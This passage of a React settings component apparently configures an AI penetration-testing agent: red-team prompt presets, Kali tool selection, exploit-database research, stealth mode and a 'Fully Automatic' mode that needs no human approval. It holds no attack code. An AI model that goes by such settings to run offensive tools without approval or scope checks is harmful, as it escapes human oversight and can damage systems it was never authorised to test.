                                 <div className="flex items-center gap-2 p-2 rounded-md bg-muted/20">
                                   <AlertTriangle className="w-3 h-3 text-accent" />
                                  Low (Advanced Users)
                                </div>
                              </SelectItem>
                            </SelectContent>
                          </Select>
                        </div>
                      </div>

                      <div className="flex items-center justify-between">
                        <div>
                          <Label>Streaming Enabled</Label>
                          <p className="text-xs text-muted-foreground">Real-time response streaming for better UX</p>
                        </div>
                        <Switch
                          checked={configuration.aiAgent.streamingEnabled}
                          onCheckedChange={(checked) => updateAIAgentConfig('streamingEnabled', checked)}
                        />
                      </div>
                    </div>

                    <Separator />

                    {/* System Prompt Configuration */}
                    <div className="space-y-3">
                      <div className="flex items-center justify-between">
                        <Label htmlFor="system-prompt">System Prompt Configuration</Label>
                        <Button
                          variant="outline"
                          size="sm"
                          onClick={() => setShowPromptManager(true)}
                          className="flex items-center gap-2"
                        >
                          <Settings className="w-3 h-3" />
                          Manage Prompts
                        </Button>
                      </div>

                      <div>
                        <Label htmlFor="prompt-preset">System Prompt Preset</Label>
                        <Select 
                          value={configuration.aiAgent.systemPromptPreset} 
                          onValueChange={handleSystemPromptPreset}
                        >
                          <SelectTrigger>
                            <SelectValue />
                          </SelectTrigger>
                          <SelectContent>
                            <SelectItem value="pentest-expert">
                              <div className="space-y-1">
                                <div className="font-medium">Penetration Testing Expert</div>
                                <div className="text-xs text-muted-foreground">Professional security assessment focus</div>
                              </div>
                            </SelectItem>
                            <SelectItem value="red-team">
                              <div className="space-y-1">
                                <div className="font-medium">Red Team Operator</div>
                                <div className="text-xs text-muted-foreground">Advanced offensive security tactics</div>
                              </div>
                            </SelectItem>
                            <SelectItem value="compliance-focused">
                              <div className="space-y-1">
                                <div className="font-medium">Compliance Expert</div>
                                <div className="text-xs text-muted-foreground">Regulatory and compliance alignment</div>
                              </div>
                            </SelectItem>
                            <SelectItem value="beginner-friendly">
                              <div className="space-y-1">
                                <div className="font-medium">Security Mentor</div>
                                <div className="text-xs text-muted-foreground">Educational and learning-focused</div>
                              </div>
                            </SelectItem>
                            {Object.keys(configuration.aiAgent.customSystemPrompts).filter(key => 
                              !['pentest-expert', 'red-team', 'compliance-focused', 'beginner-friendly'].includes(key)
                            ).map(key => (
                              <SelectItem key={key} value={key}>
                                <div className="space-y-1">
                                  <div className="font-medium">{key}</div>
                                  <div className="text-xs text-muted-foreground">Custom prompt</div>
                                </div>
                              </SelectItem>
                            ))}
                          </SelectContent>
                        </Select>
                        <p className="text-xs text-muted-foreground mt-1">
                          Choose a pre-configured prompt or create your own
                        </p>
                      </div>

                      <div>
                        <Label htmlFor="system-prompt">Current System Prompt</Label>
                        <Textarea
                          id="system-prompt"
                          value={configuration.aiAgent.systemPrompt}
                          onChange={(e) => updateAIAgentConfig('systemPrompt', e.target.value)}
                          placeholder="Define the AI agent's role and behavior..."
                          rows={6}
                          className="text-sm"
                        />
                        <div className="flex items-center justify-between mt-1">
                          <p className="text-xs text-muted-foreground">
                            Core instructions that define the AI agent's expertise and behavior
                          </p>
                          <Badge variant="outline" className="text-xs">
                            {configuration.aiAgent.systemPrompt.length} characters
                          </Badge>
                        </div>
                      </div>

                      <div>
                        <Label htmlFor="custom-instructions">Additional Instructions (Context-Specific)</Label>
                        <Textarea
                          id="custom-instructions"
                          value={configuration.aiAgent.customInstructions}
                          onChange={(e) => updateAIAgentConfig('customInstructions', e.target.value)}
                          placeholder="Additional specific instructions for this pentest configuration..."
                          rows={3}
                          className="text-sm"
                        />
                        <p className="text-xs text-muted-foreground mt-1">
                          Specific instructions that will be appended to the system prompt for this configuration
                        </p>
                      </div>
                    </div>

                    <Separator />

                    {/* Agent Test & Actions */}
                    <div className="flex items-center justify-between">
                      <div>
                        <Label>AI Agent Status</Label>
                        <p className="text-xs text-muted-foreground">
                          Current model: {configuration.aiAgent.model}
                          {configuration.aiAgent.enableReasoningMode && ` + ${configuration.aiAgent.reasoningModel}`}
                        </p>
                      </div>
                      <Button 
                        variant="outline" 
                        size="sm"
                        onClick={testAIAgent}
                        className="flex items-center gap-2"
                      >
                        <CheckCircle className="w-4 h-4" />
                        Test Agent
                      </Button>
                    </div>
                  </CardContent>
                </Card>

                {/* Automation & Guardrails Configuration */}
                <Card>
                  <CardHeader>
                    <CardTitle className="text-base flex items-center gap-2">
                      <Shield className="w-4 h-4" />
                      Automation & Guardrails
                    </CardTitle>
                    <CardDescription>
                      Configure automation modes and safety guardrails for the AI agent
                    </CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    {/* Automation Mode */}
                    <div>
                      <Label htmlFor="automation-mode">Automation Mode</Label>
                      <Select 
                        value={configuration.aiAgent.automationMode} 
                        onValueChange={(value: any) => updateAIAgentConfig('automationMode', value)}
                      >
                        <SelectTrigger>
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="fully_automatic">
                            <div className="space-y-1">
                              <div className="flex items-center gap-2">
                                <Zap className="w-4 h-4" />
                                <span className="font-medium">Fully Automatic</span>
                              </div>
                              <div className="text-xs text-muted-foreground">AI executes all actions without human approval</div>
                            </div>
                          </SelectItem>
                          <SelectItem value="human_approval">
                            <div className="space-y-1">
                              <div className="flex items-center gap-2">
                                <Eye className="w-4 h-4" />
                                <span className="font-medium">Human Approval</span>
                              </div>
                              <div className="text-xs text-muted-foreground">Requires approval for high-risk actions</div>
                            </div>
                          </SelectItem>
                          <SelectItem value="manual">
                            <div className="space-y-1">
                              <div className="flex items-center gap-2">
                                <Settings className="w-4 h-4" />
                                <span className="font-medium">Manual</span>
                              </div>
                              <div className="text-xs text-muted-foreground">All actions require explicit approval</div>
                            </div>
                          </SelectItem>
                        </SelectContent>
                      </Select>
                      <p className="text-xs text-muted-foreground mt-1">
                        Controls how much autonomy the AI agent has during testing
                      </p>
                    </div>

                    {configuration.aiAgent.automationMode !== 'fully_automatic' && (
                      <div>
                        <Label htmlFor="approval-threshold">Approval Threshold</Label>
                        <Select 
                          value={configuration.aiAgent.approvalThreshold} 
                          onValueChange={(value: any) => updateAIAgentConfig('approvalThreshold', value)}
                        >
                          <SelectTrigger>
                            <SelectValue />
                          </SelectTrigger>
                          <SelectContent>
                            <SelectItem value="low">
                              <div className="flex items-center gap-2">
                                <Badge variant="secondary" className="text-xs">Low Risk</Badge>
                                <span>Approve all low-risk and above</span>
                              </div>
                            </SelectItem>
                            <SelectItem value="medium">
                              <div className="flex items-center gap-2">
                                <Badge variant="outline" className="text-xs">Medium Risk</Badge>
                                <span>Approve medium-risk and above</span>
                              </div>
                            </SelectItem>
                            <SelectItem value="high">
                              <div className="flex items-center gap-2">
                                <Badge variant="destructive" className="text-xs">High Risk</Badge>
                                <span>Only approve high-risk actions</span>
                              </div>
                            </SelectItem>
                            <SelectItem value="critical">
                              <div className="flex items-center gap-2">
                                <Badge variant="destructive" className="text-xs">Critical</Badge>
                                <span>Only critical actions need approval</span>
                              </div>
                            </SelectItem>
                          </SelectContent>
                        </Select>
                      </div>
                    )}

                    {/* Guardrails Configuration */}
                    <Separator />
                    <div className="space-y-3">
                      <div>
                        <Label className="text-sm font-medium">Guardrails Configuration</Label>
                        <p className="text-xs text-muted-foreground">Safety rules and restrictions for AI agent actions</p>
                      </div>
                      
                      <div className="space-y-3">
                        <div className="flex items-center justify-between">
                          <div className="space-y-1">
                            <Label className="text-sm">Block Destructive Commands</Label>
                            <p className="text-xs text-muted-foreground">Prevent execution of potentially harmful system commands</p>
                          </div>
                          <Switch
                            checked={configuration.aiAgent.guardrails.rules.blockDestructiveCommands}
                            onCheckedChange={(checked) => {
                              const newGuardrails = { ...configuration.aiAgent.guardrails };
                              newGuardrails.rules.blockDestructiveCommands = checked;
                              updateAIAgentConfig('guardrails', newGuardrails);
                            }}
                          />
                        </div>

                        <div className="flex items-center justify-between">
                          <div className="space-y-1">
                            <Label className="text-sm">Validate Target Scope</Label>
                            <p className="text-xs text-muted-foreground">Ensure all actions remain within defined scope</p>
                          </div>
                          <Switch
                            checked={configuration.aiAgent.guardrails.rules.validateTargetScope}
                            onCheckedChange={(checked) => {
                              const newGuardrails = { ...configuration.aiAgent.guardrails };
                              newGuardrails.rules.validateTargetScope = checked;
                              updateAIAgentConfig('guardrails', newGuardrails);
                            }}
                          />
                        </div>

                        <div className="flex items-center justify-between">
                          <div className="space-y-1">
                            <Label className="text-sm">Prevent Data Exfiltration</Label>
                            <p className="text-xs text-muted-foreground">Block commands that could extract sensitive data</p>
                          </div>
                          <Switch
                            checked={configuration.aiAgent.guardrails.rules.preventDataExfiltration}
                            onCheckedChange={(checked) => {
                              const newGuardrails = { ...configuration.aiAgent.guardrails };
                              newGuardrails.rules.preventDataExfiltration = checked;
                              updateAIAgentConfig('guardrails', newGuardrails);
                            }}
                          />
                        </div>

                        <div className="flex items-center justify-between">
                          <div className="space-y-1">
                            <Label className="text-sm">Limit Resource Usage</Label>
                            <p className="text-xs text-muted-foreground">Restrict CPU, memory, and network usage</p>
                          </div>
                          <Switch
                            checked={configuration.aiAgent.guardrails.rules.limitResourceUsage}
                            onCheckedChange={(checked) => {
                              const newGuardrails = { ...configuration.aiAgent.guardrails };
                              newGuardrails.rules.limitResourceUsage = checked;
                              updateAIAgentConfig('guardrails', newGuardrails);
                            }}
                          />
                        </div>
                      </div>
                    </div>
                  </CardContent>
                </Card>

                {/* Kali MCP Server Configuration */}
                <Card>
                  <CardHeader>
                    <CardTitle className="text-base flex items-center gap-2">
                      <Terminal className="w-4 h-4" />
                      Kali Linux MCP Server
                    </CardTitle>
                    <CardDescription>
                      Configure the Kali Linux Model Context Protocol server for tool execution
                    </CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div className="flex items-center justify-between">
                      <div className="space-y-1">
                        <Label className="text-sm font-medium">Enable Kali MCP Server</Label>
                        <p className="text-xs text-muted-foreground">Connect to a Kali Linux MCP server for secure tool execution</p>
                      </div>
                      <Switch
                        checked={configuration.aiAgent.kaliMCPServer.enabled}
                        onCheckedChange={(checked) => {
                          const newMCPServer = { ...configuration.aiAgent.kaliMCPServer };
                          newMCPServer.enabled = checked;
                          updateAIAgentConfig('kaliMCPServer', newMCPServer);
                        }}
                      />
                    </div>

                    {configuration.aiAgent.kaliMCPServer.enabled && (
                      <div className="space-y-4 p-3 border rounded-lg bg-muted/20">
                        <div className="grid grid-cols-2 gap-3">
                          <div>
                            <Label htmlFor="mcp-endpoint">Server Endpoint</Label>
                            <Input
                              id="mcp-endpoint"
                              value={configuration.aiAgent.kaliMCPServer.serverEndpoint}
                              onChange={(e) => {
                                const newMCPServer = { ...configuration.aiAgent.kaliMCPServer };
                                newMCPServer.serverEndpoint = e.target.value;
                                updateAIAgentConfig('kaliMCPServer', newMCPServer);
                              }}
                              placeholder="http://kali-mcp-server.local"
                            />
                          </div>
                          
                          <div>
                            <Label htmlFor="mcp-port">Port</Label>
                            <Input
                              id="mcp-port"
                              type="number"
                              value={configuration.aiAgent.kaliMCPServer.port}
                              onChange={(e) => {
                                const newMCPServer = { ...configuration.aiAgent.kaliMCPServer };
                                newMCPServer.port = parseInt(e.target.value) || 8080;
                                updateAIAgentConfig('kaliMCPServer', newMCPServer);
                              }}
                              placeholder="8080"
                            />
                          </div>
                        </div>

                        <div>
                          <Label className="text-sm font-medium">Enabled Tools</Label>
                          <p className="text-xs text-muted-foreground mb-2">Select which penetration testing tools are available</p>
                          <div className="grid grid-cols-3 gap-2">
                            {['nmap', 'sqlmap', 'nikto', 'gobuster', 'nuclei', 'amass', 'ffuf', 'dirb', 'whatweb', 'masscan'].map((tool) => (
                              <div key={tool} className="flex items-center space-x-2">
                                <Checkbox
                                  id={`tool-${tool}`}
                                  checked={configuration.aiAgent.kaliMCPServer.enabledTools.includes(tool)}
                                  onCheckedChange={(checked) => {
                                    const newMCPServer = { ...configuration.aiAgent.kaliMCPServer };
                                    if (checked) {
                                      newMCPServer.enabledTools = [...newMCPServer.enabledTools, tool];
                                    } else {
                                      newMCPServer.enabledTools = newMCPServer.enabledTools.filter(t => t !== tool);
                                    }
                                    updateAIAgentConfig('kaliMCPServer', newMCPServer);
                                  }}
                                />
                                <Label htmlFor={`tool-${tool}`} className="text-sm font-mono">{tool}</Label>
                              </div>
                            ))}
                          </div>
                        </div>

                        <div className="space-y-3">
                          <Label className="text-sm font-medium">Security Settings</Label>
                          
                          <div className="flex items-center justify-between">
                            <div className="space-y-1">
                              <Label className="text-sm">Sandbox Mode</Label>
                              <p className="text-xs text-muted-foreground">Run tools in isolated environment</p>
                            </div>
                            <Switch
                              checked={configuration.aiAgent.kaliMCPServer.securitySettings.sandboxMode}
                              onCheckedChange={(checked) => {
                                const newMCPServer = { ...configuration.aiAgent.kaliMCPServer };
                                newMCPServer.securitySettings.sandboxMode = checked;
                                updateAIAgentConfig('kaliMCPServer', newMCPServer);
                              }}
                            />
                          </div>

                          <div className="flex items-center justify-between">
                            <div className="space-y-1">
                              <Label className="text-sm">Allow Network Access</Label>
                              <p className="text-xs text-muted-foreground">Permit outbound network connections</p>
                            </div>
                            <Switch
                              checked={configuration.aiAgent.kaliMCPServer.securitySettings.allowNetworkAccess}
                              onCheckedChange={(checked) => {
                                const newMCPServer = { ...configuration.aiAgent.kaliMCPServer };
                                newMCPServer.securitySettings.allowNetworkAccess = checked;
                                updateAIAgentConfig('kaliMCPServer', newMCPServer);
                              }}
                            />
                          </div>
                        </div>
                      </div>
                    )}
                  </CardContent>
                </Card>

                {/* Online Research & HackTricks Integration */}
                <Card>
                  <CardHeader>
                    <CardTitle className="text-base flex items-center gap-2">
                      <BookOpen className="w-4 h-4" />
                      Online Research & HackTricks
                    </CardTitle>
                    <CardDescription>
                      Configure online research capabilities and HackTricks methodology integration
                    </CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    {/* HackTricks Integration */}
                    <div className="space-y-3">
                      <div className="flex items-center justify-between">
                        <div className="space-y-1">
                          <Label className="text-sm font-medium">Enable HackTricks Integration</Label>
                          <p className="text-xs text-muted-foreground">Automatically load attack methodologies from HackTricks</p>
                        </div>
                        <Switch
                          checked={configuration.aiAgent.hackTricksIntegration.enabled}
                          onCheckedChange={(checked) => {
                            const newHackTricks = { ...configuration.aiAgent.hackTricksIntegration };
                            newHackTricks.enabled = checked;
                            updateAIAgentConfig('hackTricksIntegration', newHackTricks);
                          }}
                        />
                      </div>

                      {configuration.aiAgent.hackTricksIntegration.enabled && (
                        <div className="space-y-3 p-3 border rounded-lg bg-muted/20">
                          <div className="flex items-center justify-between">
                            <div className="space-y-1">
                              <Label className="text-sm">Auto-Load Methodology</Label>
                              <p className="text-xs text-muted-foreground">Automatically load relevant attack books</p>
                            </div>
                            <Switch
                              checked={configuration.aiAgent.hackTricksIntegration.autoLoadMethodology}
                              onCheckedChange={(checked) => {
                                const newHackTricks = { ...configuration.aiAgent.hackTricksIntegration };
                                newHackTricks.autoLoadMethodology = checked;
                                updateAIAgentConfig('hackTricksIntegration', newHackTricks);
                              }}
                            />
                          </div>

                          <div>
                            <Label className="text-sm font-medium">Preferred Categories</Label>
                            <p className="text-xs text-muted-foreground mb-2">Select which HackTricks categories to prioritize</p>
                            <div className="grid grid-cols-2 gap-2">
                              {['web', 'network', 'active-directory', 'kubernetes', 'cloud', 'mobile', 'windows', 'linux'].map((category) => (
                                <div key={category} className="flex items-center space-x-2">
                                  <Checkbox
                                    id={`category-${category}`}
                                    checked={configuration.aiAgent.hackTricksIntegration.preferredCategories.includes(category)}
                                    onCheckedChange={(checked) => {
                                      const newHackTricks = { ...configuration.aiAgent.hackTricksIntegration };
                                      if (checked) {
                                        newHackTricks.preferredCategories = [...newHackTricks.preferredCategories, category];
                                      } else {
                                        newHackTricks.preferredCategories = newHackTricks.preferredCategories.filter(c => c !== category);
                                      }
                                      updateAIAgentConfig('hackTricksIntegration', newHackTricks);
                                    }}
                                  />
                                  <Label htmlFor={`category-${category}`} className="text-sm capitalize">{category.replace('-', ' ')}</Label>
                                </div>
                              ))}
                            </div>
                          </div>
                        </div>
                      )}
                    </div>

                    <Separator />

                    {/* Online Research */}
                    <div className="space-y-3">
                      <div className="flex items-center justify-between">
                        <div className="space-y-1">
                          <Label className="text-sm font-medium">Enable Online Research</Label>
                          <p className="text-xs text-muted-foreground">Use online sources for real-time threat intelligence</p>
                        </div>
                        <Switch
                          checked={configuration.aiAgent.onlineResearch.enabled}
                          onCheckedChange={(checked) => {
                            const newResearch = { ...configuration.aiAgent.onlineResearch };
                            newResearch.enabled = checked;
                            updateAIAgentConfig('onlineResearch', newResearch);
                          }}
                        />
                      </div>

                      {configuration.aiAgent.onlineResearch.enabled && (
                        <div className="space-y-4 p-3 border rounded-lg bg-muted/20">
                          <div>
                            <Label className="text-sm font-medium">Research Providers</Label>
                            <p className="text-xs text-muted-foreground mb-2">Select which online sources to use</p>
                            <div className="space-y-2">
                              {Object.entries({
                                hacktricks: 'HackTricks.xyz',
                                perplexity: 'Perplexity AI',
                                shodan: 'Shodan',
                                cve: 'CVE Database',
                                exploit_db: 'Exploit Database'
                              }).map(([key, label]) => (
                                <div key={key} className="flex items-center space-x-2">
                                  <Checkbox
                                    id={`provider-${key}`}
                                    checked={configuration.aiAgent.onlineResearch.providers[key as keyof typeof configuration.aiAgent.onlineResearch.providers]}
                                    onCheckedChange={(checked) => {
                                      const newResearch = { ...configuration.aiAgent.onlineResearch };
                                      newResearch.providers = { ...newResearch.providers, [key]: checked };
                                      updateAIAgentConfig('onlineResearch', newResearch);
                                    }}
                                  />
                                  <Label htmlFor={`provider-${key}`} className="text-sm">{label}</Label>
                                </div>
                              ))}
                            </div>
                          </div>

                          <div>
                            <Label htmlFor="research-depth">Research Depth</Label>
                            <Select 
                              value={configuration.aiAgent.onlineResearch.researchDepth} 
                              onValueChange={(value: any) => {
                                const newResearch = { ...configuration.aiAgent.onlineResearch };
                                newResearch.researchDepth = value;
                                updateAIAgentConfig('onlineResearch', newResearch);
                              }}
                            >
                              <SelectTrigger>
                                <SelectValue />
                              </SelectTrigger>
                              <SelectContent>
                                <SelectItem value="basic">Basic - Quick lookups only</SelectItem>
                                <SelectItem value="comprehensive">Comprehensive - Detailed research</SelectItem>
                                <SelectItem value="deep">Deep - Exhaustive analysis</SelectItem>
                              </SelectContent>
                            </Select>
                          </div>

                          <div className="flex items-center justify-between">
                            <div className="space-y-1">
                              <Label className="text-sm">Auto Research</Label>
                              <p className="text-xs text-muted-foreground">Automatically research new findings</p>
                            </div>
                            <Switch
                              checked={configuration.aiAgent.onlineResearch.autoResearch}
                              onCheckedChange={(checked) => {
                                const newResearch = { ...configuration.aiAgent.onlineResearch };
                                newResearch.autoResearch = checked;
                                updateAIAgentConfig('onlineResearch', newResearch);
                              }}
                            />
                          </div>
                        </div>
                      )}
                    </div>
                  </CardContent>
                </Card>

                {/* Agent Capabilities Overview */}
                <Card>
                  <CardHeader>
                    <CardTitle className="text-base">Agent Capabilities</CardTitle>
                    <CardDescription>
                      What the AI agent can do with the current configuration
                    </CardDescription>
                  </CardHeader>
                  <CardContent>
                    <div className="grid grid-cols-2 gap-4 text-sm">
                      <div className="space-y-2">
                        <div className="flex items-center gap-2">
                          <CheckCircle className="w-4 h-4 text-primary" />
                          <span>Automated vulnerability analysis</span>
                        </div>
                        <div className="flex items-center gap-2">
                          <CheckCircle className="w-4 h-4 text-primary" />
                          <span>Intelligent attack path planning</span>
                        </div>
                        <div className="flex items-center gap-2">
                          <CheckCircle className="w-4 h-4 text-primary" />
                          <span>Real-time threat correlation</span>
                        </div>
                        <div className="flex items-center gap-2">
                          {configuration.aiAgent.enableReasoningMode ? (
                            <CheckCircle className="w-4 h-4 text-primary" />
                          ) : (
                            <span className="w-4 h-4 rounded-full bg-muted" />
                          )}
                          <span className={configuration.aiAgent.enableReasoningMode ? '' : 'text-muted-foreground'}>
                            Advanced reasoning & multi-step analysis
                          </span>
                        </div>
                      </div>
                      <div className="space-y-2">
                        <div className="flex items-center gap-2">
                          <CheckCircle className="w-4 h-4 text-primary" />
                          <span>Comprehensive report generation</span>
                        </div>
                        <div className="flex items-center gap-2">
                          <CheckCircle className="w-4 h-4 text-primary" />
                          <span>Risk assessment & prioritization</span>
                        </div>
                        <div className="flex items-center gap-2">
                          <CheckCircle className="w-4 h-4 text-primary" />
                          <span>Remediation recommendations</span>
                        </div>
                        <div className="flex items-center gap-2">
                          {configuration.aiAgent.streamingEnabled ? (
                            <CheckCircle className="w-4 h-4 text-primary" />
                          ) : (
                            <span className="w-4 h-4 rounded-full bg-muted" />
                          )}
                          <span className={configuration.aiAgent.streamingEnabled ? '' : 'text-muted-foreground'}>
                            Real-time streaming updates
                          </span>
                        </div>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              </TabsContent>
              
              <TabsContent value="settings" className="space-y-4 mt-0">
                <Card>
                  <CardHeader>
                    <CardTitle className="text-base flex items-center gap-2">
                      <Gauge className="w-4 h-4" />
                      Global Settings
                    </CardTitle>
                    <CardDescription>
                      Configure global penetration test parameters
                    </CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div>
                      <div className="flex items-center justify-between mb-2">
                        <Label className="text-sm font-medium">Global Aggression Level</Label>
                        <Badge variant="outline" className="text-xs">
                          {configuration.globalSettings.aggressionLevel}/5
                        </Badge>
                      </div>
                      <Slider
                        value={[configuration.globalSettings.aggressionLevel]}
                        onValueChange={([value]) => updateGlobalSettings('aggressionLevel', value)}
                        max={5}
                        min={1}
                        step={1}
                        className="w-full"
                      />
                      <div className="flex justify-between text-xs text-muted-foreground mt-1">
                        <span>Conservative</span>
                        <span>Aggressive</span>
                      </div>
                    </div>
                    
                    <Separator />
                    
                    <div className="grid grid-cols-2 gap-4">
                      <div>
                        <Label htmlFor="timeout" className="text-sm">Timeout (seconds)</Label>
                        <Input
                          id="timeout"
                          type="number"
                          value={configuration.globalSettings.timeout}
                          onChange={(e) => updateGlobalSettings('timeout', parseInt(e.target.value) || 300)}
                          min={30}
                          max={3600}
                        />
                      </div>
                      
                      <div>
                        <Label htmlFor="retries" className="text-sm">Max Retries</Label>
                        <Input
                          id="retries"
                          type="number"
                          value={configuration.globalSettings.retries}
                          onChange={(e) => updateGlobalSettings('retries', parseInt(e.target.value) || 3)}
                          min={1}
                          max={10}
                        />
                      </div>
                    </div>
                    
                    <div>
                      <Label htmlFor="concurrency" className="text-sm">Concurrency Level</Label>
                      <Input
                        id="concurrency"
                        type="number"
                        value={configuration.globalSettings.concurrency}
                        onChange={(e) => updateGlobalSettings('concurrency', parseInt(e.target.value) || 5)}
                        min={1}
                        max={50}
                      />
                    </div>
                    
                    <Separator />
                    
                    <div className="space-y-3">
                      <div className="flex items-center justify-between">
                        <Label htmlFor="stealth" className="text-sm">Stealth Mode</Label>
                        <Switch
                          id="stealth"
                          checked={configuration.globalSettings.stealth}
                          onCheckedChange={(checked) => updateGlobalSettings('stealth', checked)}
                        />
                      </div>
                      
                      <div className="flex items-center justify-between">
                        <Label htmlFor="automated" className="text-sm">Fully Automated</Label>
                        <Switch
                          id="automated"
                          checked={configuration.globalSettings.automated}
                          onCheckedChange={(checked) => updateGlobalSettings('automated', checked)}
                        />
                      </div>
                    </div>
                    
                    <div>
                      <Label htmlFor="reporting" className="text-sm">Reporting Level</Label>
                      <Select
                        value={configuration.globalSettings.reportingLevel}
                        onValueChange={(value: any) => updateGlobalSettings('reportingLevel', value)}
                      >
                        <SelectTrigger>
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="minimal">Minimal</SelectItem>
                          <SelectItem value="standard">Standard</SelectItem>
                          <SelectItem value="comprehensive">Comprehensive</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>
                  </CardContent>
                </Card>
                
                <Card>
                  <CardHeader>
                    <CardTitle className="text-base">Configuration Summary</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="grid grid-cols-2 gap-4 text-sm">
                      <div className="space-y-2">
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">Enabled Modules:</span>
                          <span className="font-medium">
                            {configuration.modules.filter(m => m.enabled).length}
                          </span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">Active Frameworks:</span>
                          <span className="font-medium">
                            {configuration.frameworks.filter(f => f.enabled).length}
                          </span>
                        </div>
                      </div>
                      <div className="space-y-2">
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">Enabled Tools:</span>
                          <span className="font-medium">
                            {configuration.tools.filter(t => t.enabled).length}
                          </span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">High Risk Tools:</span>
                          <span className="font-medium text-orange-600">
                            {configuration.tools.filter(t => t.enabled && (t.riskLevel === 'high' || t.riskLevel === 'critical')).length}
                          </span>
                        </div>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              </TabsContent>
              </div>
            </ScrollArea>
          </Tabs>
        </div>
      </div>

      {/* System Prompt Manager Dialog */}
      {showPromptManager && (
        <Dialog open={showPromptManager} onOpenChange={setShowPromptManager}>
          <DialogContent className="max-w-4xl h-[80vh] p-0 overflow-hidden">
            <DialogHeader className="p-6 pb-4 flex-shrink-0">
              <DialogTitle className="flex items-center gap-2">
                <Settings className="h-5 w-5" />
                System Prompt Manager
              </DialogTitle>
              <DialogDescription>
                Manage and configure AI agent system prompts for different penetration testing scenarios
              </DialogDescription>
            </DialogHeader>
            
            <ScrollArea className="flex-1">
              <div className="p-6 pt-2 space-y-6">
              {/* Preset Prompts */}
              <div>
                <h3 className="text-lg font-semibold mb-3">Preset Prompts</h3>
                <div className="grid gap-4">
                  {Object.entries(configuration.aiAgent.customSystemPrompts).map(([key, prompt]) => (
                    <Card key={key} className="p-4">
                      <div className="flex items-start justify-between mb-2">
                        <div>
                          <h4 className="font-medium capitalize">{key.replace('-', ' ')}</h4>
                          <p className="text-sm text-muted-foreground">
                            {prompt.length > 100 ? `${prompt.substring(0, 100)}...` : prompt}
                          </p>
                        </div>
                        <Button
                          size="sm"
                          variant="outline"
                          onClick={() => handleSystemPromptPreset(key)}
                          disabled={configuration.aiAgent.systemPromptPreset === key}
                        >
                          Use This
                        </Button>
                      </div>
                    </Card>
                  ))}
                </div>
              </div>

              <Separator />

              {/* Create New Prompt */}
              <div>
                <h3 className="text-lg font-semibold mb-3">Create Custom Prompt</h3>
                <div className="space-y-4">
                  <div>
                    <Label htmlFor="new-prompt-name">Prompt Name</Label>
                    <Input
                      id="new-prompt-name"
                      value={newPromptName}
                      onChange={(e) => setNewPromptName(e.target.value)}
                      placeholder="e.g., web-app-specialist"
                    />
                  </div>
                  
                  <div>
                    <Label htmlFor="new-prompt-content">Prompt Content</Label>
                    <Textarea
                      id="new-prompt-content"
                      value={newPromptContent}
                      onChange={(e) => setNewPromptContent(e.target.value)}
                      placeholder="You are an expert cybersecurity AI agent..."
                      rows={8}
                      className="text-sm"
                    />
                  </div>

                  <div className="flex justify-end gap-2">
                    <Button
                      variant="outline"
                      onClick={() => {
                        setNewPromptName('');
                        setNewPromptContent('');
                      }}
                    >
                      Clear
                    </Button>
                    <Button
                      onClick={() => {
                        saveCustomSystemPrompt(newPromptName, newPromptContent);
                        setNewPromptName('');
                        setNewPromptContent('');
                      }}
                      disabled={!newPromptName.trim() || !newPromptContent.trim()}
                    >
                      Save Prompt
                    </Button>
                  </div>
                </div>
              </div>
              </div>
            </ScrollArea>
          </DialogContent>
        </Dialog>
      )}
    </div>
  );
};